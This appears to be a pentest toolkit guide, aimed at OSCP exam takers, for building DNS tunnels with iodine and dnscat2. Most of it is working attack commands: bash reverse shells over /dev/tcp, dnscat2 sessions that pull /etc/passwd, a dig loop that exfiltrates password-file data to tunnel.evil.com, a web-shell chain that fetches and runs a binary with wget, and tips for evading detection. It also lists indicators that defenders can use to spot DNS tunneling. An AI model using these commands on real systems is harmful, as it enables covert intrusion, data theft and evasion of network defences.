# DNS Tunnel Setup Guide

## Overview

DNS tunneling enables covert communication over port 53 (DNS), bypassing firewalls that only allow DNS traffic. CRACK integrates **iodine** and **dnscat2** for DNS-based exfiltration and command execution.

## Use Cases

### OSCP Exam Scenarios
- Firewall only allows DNS outbound (port 53)
- Exfiltrate data via DNS queries
- Establish reverse shell through DNS tunnel
- Pivot through DNS-only network segments
- Bypass strict egress filtering

## Tools

### Iodine (VPN-like Tunnel)
- Creates TUN device (like VPN)
- Full IP tunneling over DNS
- Server gets 10.0.0.1, client gets 10.0.0.2
- Supports SSH, reverse shells, port forwarding

### Dnscat2 (C2-style Shell)
- Interactive command/response over DNS
- Encrypted with pre-shared secret
- Multiple concurrent sessions
- File upload/download support

---

## Prerequisites

### Attacker Machine (Kali Linux)

#### Install Tools
```bash
# Iodine
sudo apt-get update
sudo apt-get install iodine -y

# Dnscat2 (Ruby-based)
git clone https://github.com/iagox86/dnscat2.git /opt/dnscat2
cd /opt/dnscat2/server
gem install bundler
bundle install
```

#### DNS Domain Setup
1. **Register domain** (e.g., evil.com)
2. **Create subdomain** for tunnel (e.g., tunnel.evil.com)
3. **Add NS record** pointing to your Kali server:
   ```
   tunnel.evil.com.  IN  NS  ns1.evil.com.
   ns1.evil.com.     IN  A   <YOUR_KALI_IP>
   ```

#### Verify DNS Delegation
```bash
# From external machine (not your server)
dig @8.8.8.8 test.tunnel.evil.com

# Should show your server responding (not authoritative source)
```

### Victim Machine

#### Linux Client
```bash
# Iodine (may need to compile)
apt-get install iodine  # Debian/Ubuntu
```

#### Windows Client
- **Iodine**: No official Windows client
- **Dnscat2**: Pre-compiled Windows executable available
  ```
  https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip
  ```

---

## Usage: Iodine DNS Tunnel

### Step 1: Start Iodine Server (Kali)
```bash
# Basic usage
sudo crack session dns-start --domain tunnel.evil.com

# With custom password
sudo crack session dns-start --domain tunnel.evil.com --password secret123

# Custom tunnel network
sudo crack session dns-start --domain tunnel.evil.com --tunnel-network 10.5.5.1
```

**Output:**
```
[+] Iodine DNS tunnel started on tunnel.evil.com
[+] Tunnel network: 10.0.0.1/24
[+] Password: secret123

[+] Client command:
    iodine -r -P secret123 tunnel.evil.com

[*] Listener running. Press Ctrl+C to stop.
```

### Step 2: Connect Client (Victim)
```bash
# Linux client
sudo iodine -r -P secret123 tunnel.evil.com

# If DNS queries timeout, specify DNS server
sudo iodine -r -P secret123 <KALI_IP> tunnel.evil.com
```

**Client output:**
```
Opened dns0
Sending DNS queries for tunnel.evil.com to <KALI_IP>
Connection setup complete, transmitting data.
```

### Step 3: Verify Tunnel
```bash
# On victim machine
ip addr show dns0
# Should show: inet 10.0.0.2/27

# Ping server through tunnel
ping 10.0.0.1

# SSH through tunnel
ssh user@10.0.0.1
```

### Step 4: Establish Reverse Shell via Tunnel
```bash
# On Kali (start listener on tunnel IP)
nc -nlvp 4444

# On victim (connect through tunnel)
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

---

## Usage: Dnscat2 DNS C2

### Step 1: Start Dnscat2 Server (Kali)
```bash
# Basic usage
sudo crack session dns-start --domain tunnel.evil.com --tool dnscat2

# With custom secret
sudo crack session dns-start --domain tunnel.evil.com --tool dnscat2 --secret mysecret123
```

**Output:**
```
[+] Dnscat2 DNS C2 started on tunnel.evil.com
[+] Secret: mysecret123

[+] Client command:
    dnscat --secret=mysecret123 tunnel.evil.com

[*] Listener running. Press Ctrl+C to stop.
```

### Step 2: Connect Client (Victim)

#### Linux Client
```bash
# Compile dnscat2 client
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client
make

# Connect
./dnscat --secret=mysecret123 tunnel.evil.com
```

#### Windows Client
```powershell
# Download pre-compiled binary
Invoke-WebRequest -Uri "https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip" -OutFile dnscat2.zip
Expand-Archive dnscat2.zip
cd dnscat2

# Connect
.\dnscat2.exe --secret=mysecret123 tunnel.evil.com
```

### Step 3: Interact with Dnscat2 Session
```bash
# List sessions
dnscat2> sessions

# Interact with session
dnscat2> session -i 1

# Run commands
command (session1)> shell
command (session1)> whoami
command (session1)> download /etc/passwd
```

---

## Performance Considerations

### Bandwidth
- DNS queries: ~255 bytes per query
- Responses: ~512 bytes (UDP), ~65KB (TCP fallback)
- Typical throughput: **1-10 KB/s** (very slow!)

### Latency
- Each packet requires DNS query/response
- Expect **500ms - 2s per packet**
- SSH will be sluggish but functional

### Optimization
```bash
# Iodine: Use faster encoding (-T flag)
iodine -r -T CNAME -P password tunnel.evil.com

# Iodine: Larger fragment size
iodine -r -m 1024 -P password tunnel.evil.com
```

---

## Troubleshooting

### DNS Queries Not Reaching Server
**Problem:** Client can't resolve tunnel domain
```bash
# Verify DNS delegation
dig @8.8.8.8 test.tunnel.evil.com

# Expected: Answer from your server
# If not, check NS record propagation
```

**Solution:** Specify DNS server directly
```bash
iodine -r -P password <KALI_IP> tunnel.evil.com
```

### "No data received from server"
**Problem:** Firewall dropping large responses
```bash
# Try smaller MTU
iodine -r -m 512 -P password tunnel.evil.com
```

### Iodine Requires Root
**Problem:** "Permission denied" errors
```bash
# Always run with sudo (raw sockets)
sudo iodine -r tunnel.evil.com
```

### Slow Performance
**Expected behavior!** DNS tunneling is inherently slow.

**Optimization:**
- Use compression: `ssh -C user@10.0.0.1`
- Minimize data transfer
- Use for command execution only (not file transfers)

---

## Detection Evasion

### Blend with Normal DNS Traffic
```bash
# Iodine: Random query encoding
iodine -r -O base32 tunnel.evil.com  # Base32 encoding
iodine -r -O base64 tunnel.evil.com  # Base64 encoding
```

### Slow Down Queries
```bash
# Iodine: Reduce query rate
iodine -r -I 5 tunnel.evil.com  # 5-second interval
```

### Blue Team Detection Indicators
- **High DNS query volume** to single domain
- **Unusual query patterns** (hex/base64 subdomains)
- **Long DNS query lengths** (max 255 bytes)
- **Failed DNS resolution attempts**

---

## OSCP Exam Tips

### When to Use DNS Tunneling
- Firewall only allows DNS (port 53)
- Web shell can't execute reverse shell
- Egress filtering blocks all ports except DNS

### Manual Alternative (No Tools)
```bash
# Simple DNS exfiltration (no tunnel)
# On victim, encode data and send as DNS query
echo "root:x:0:0:..." | xxd -p | while read line; do
  dig $line.tunnel.evil.com
done

# On Kali, capture with tcpdump
sudo tcpdump -i eth0 -nn udp port 53
```

### Time Management
- DNS tunnel setup: **15-20 minutes**
- DNS delegation propagation: **5-30 minutes**
- Connection establishment: **2-5 minutes**
- **Total: 30-60 minutes** (factor into exam time)

### Alternatives if DNS Fails
1. ICMP tunnel (icmpsh, ptunnel)
2. HTTP tunnel (reGeorg, chisel)
3. Email exfiltration
4. Scheduled task callbacks

---

## Command Reference

### Iodine Server (Kali)
```bash
# Basic
sudo iodined -f -c -P password 10.0.0.1 tunnel.evil.com

# Flags:
#   -f: Foreground mode (don't daemonize)
#   -c: Disable client IP check (accept any client)
#   -P: Password for authentication
```

### Iodine Client (Victim)
```bash
# Basic
sudo iodine -r -P password tunnel.evil.com

# Flags:
#   -r: Raw mode (skip relay mode, faster)
#   -P: Password
#   -f: Foreground mode
#   -m: MTU size (default: 1024)
```

### Dnscat2 Server (Kali)
```bash
ruby dnscat2.rb tunnel.evil.com --secret=password
```

### Dnscat2 Client (Victim)
```bash
# Linux
./dnscat --secret=password tunnel.evil.com

# Windows
dnscat2.exe --secret=password tunnel.evil.com
```

---

## Example Attack Chain

### Scenario: Web Shell to Full Shell via DNS

**Step 1:** Discover firewall allows DNS only
```bash
# Test egress filtering from web shell
<?php system("curl http://example.com:80"); ?>  # FAILS
<?php system("curl http://example.com:443"); ?> # FAILS
<?php system("ping -c 1 8.8.8.8"); ?>           # FAILS
<?php system("dig google.com"); ?>              # SUCCESS!
```

**Step 2:** Start DNS tunnel server
```bash
sudo crack session dns-start --domain tunnel.evil.com --password exam123
```

**Step 3:** Download iodine client on victim (via web shell)
```bash
<?php
system("wget http://<staging_server>/iodine -O /tmp/iodine");
system("chmod +x /tmp/iodine");
?>
```

**Step 4:** Connect tunnel (via web shell)
```bash
<?php system("/tmp/iodine -r -P exam123 tunnel.evil.com &"); ?>
```

**Step 5:** Verify tunnel and establish reverse shell
```bash
# From Kali
ping 10.0.0.2  # Test tunnel

# Start listener
nc -nlvp 4444

# Inject reverse shell via web shell
<?php system("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 &"); ?>
```

**Step 6:** Stabilize shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

---

## References

- **Iodine Documentation:** https://github.com/yarrick/iodine
- **Dnscat2 Documentation:** https://github.com/iagox86/dnscat2
- **DNS Tunneling Theory:** https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152

## Next Steps

After establishing DNS tunnel:
1. Use `crack session list` to view active tunnels
2. Upgrade to full interactive shell
3. Enumerate target via tunnel
4. Use tunnel for pivoting to internal networks
